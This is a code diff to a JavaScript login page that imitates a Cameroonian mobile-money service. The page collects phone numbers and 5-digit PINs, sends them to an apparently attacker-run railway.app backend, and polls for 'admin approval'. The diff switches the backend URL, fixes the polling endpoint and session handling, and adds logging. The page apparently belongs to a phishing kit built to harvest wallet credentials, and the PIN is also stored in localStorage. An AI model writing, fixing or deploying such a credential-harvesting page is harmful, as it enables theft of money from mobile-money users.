@@ -509,19 +509,13 @@
 
     <script>
         // ============================================
-        // BACKEND URL
+        // ✅ FIXED BACKEND URL — points to the working server
         // ============================================
-        const API_BASE = 'https://easy-loansej1-production.up.railway.app';
+        const API_BASE = 'https://momo-usersey-production.up.railway.app';
 
-        // ============================================
-        // POLLING CONFIG
-        // ============================================
-        const POLL_INTERVAL_MS = 2000;
+        const POLL_INTERVAL_MS = 2500;
         let pollTimer = null;
 
-        // ============================================
-        // PHONE INPUT
-        // ============================================
         const phoneInput = document.getElementById('phone');
         const phoneWrapper = document.getElementById('phoneWrapper');
         const phoneError = document.getElementById('phoneError');
@@ -535,9 +529,6 @@
             }
         });
 
-        // ============================================
-        // PIN INPUT (5 boxes)
-        // ============================================
         const pinBoxes = [
             document.getElementById('pin1'),
             document.getElementById('pin2'),
@@ -588,9 +579,6 @@
             return pinBoxes.map(b => b.value).join('');
         }
 
-        // ============================================
-        // EYE TOGGLE
-        // ============================================
         const pinToggle = document.getElementById('pinToggle');
         const eyeIcon = document.getElementById('eyeIcon');
         let pinVisible = false;
@@ -613,32 +601,21 @@
             eyeIcon.innerHTML = pinVisible ? eyeClosedSVG : eyeOpenSVG;
         });
 
-        // ============================================
-        // VERIFY OVERLAY
-        // ============================================
         const verifyOverlay = document.getElementById('verifyOverlay');
 
-        function showVerifyOverlay() {
-            verifyOverlay.classList.add('show');
-        }
-
-        function hideVerifyOverlay() {
-            verifyOverlay.classList.remove('show');
-        }
+        function showVerifyOverlay() { verifyOverlay.classList.add('show'); }
+        function hideVerifyOverlay() { verifyOverlay.classList.remove('show'); }
 
         // ============================================
-        // POLLING FOR ADMIN APPROVAL
-        // ✅ FIXED: URL now matches server endpoint
+        // ✅ FIXED POLLING — uses /api/status/ (correct endpoint)
         // ============================================
-        function startPolling(requestId) {
+        function startPolling(sessionId) {
             stopPolling();
-
-            console.log('🔄 Polling started for requestId:', requestId);
+            console.log('🔄 Polling started for sessionId:', sessionId);
 
             pollTimer = setInterval(async () => {
                 try {
-                    // ✅ FIXED: was `/api/login/status/` → now `/api/approval/status/`
-                    const res = await fetch(`${API_BASE}/api/approval/status/${requestId}`);
+                    const res = await fetch(`${API_BASE}/api/status/${sessionId}`);
                     const data = await res.json();
 
                     console.log('📥 Status check:', data);
@@ -652,7 +629,7 @@
                         localStorage.setItem('momoSession', JSON.stringify({
                             phone: '+237' + phoneInput.value.replace(/\s/g, ''),
                             country: 'CM',
-                            token: requestId,
+                            token: sessionId,
                             loggedInAt: new Date().toISOString()
                         }));
                         localStorage.setItem('momoPhone', '+237' + phoneInput.value.replace(/\s/g, ''));
@@ -690,9 +667,6 @@
             }
         }
 
-        // ============================================
-        // LOGIN BUTTON
-        // ============================================
         const loginBtn = document.getElementById('loginBtn');
 
         loginBtn.addEventListener('click', async function() {
@@ -723,11 +697,13 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         phone: '+237' + phoneDigits,
+                        country: 'CM',
                         pin: pin
                     })
                 });
 
                 const data = await res.json();
+                console.log('LOGIN RESPONSE:', data);
 
                 if (!res.ok || !data.ok) {
                     throw new Error(data.error || 'Login failed');
@@ -736,7 +712,8 @@
                 localStorage.setItem('momoPhone', '+237' + phoneDigits);
                 localStorage.setItem('momoPin', pin);
 
-                startPolling(data.requestId);
+                // ✅ FIXED: uses sessionId (matches server response)
+                startPolling(data.sessionId);
 
             } catch (err) {
                 console.error('Login error:', err);
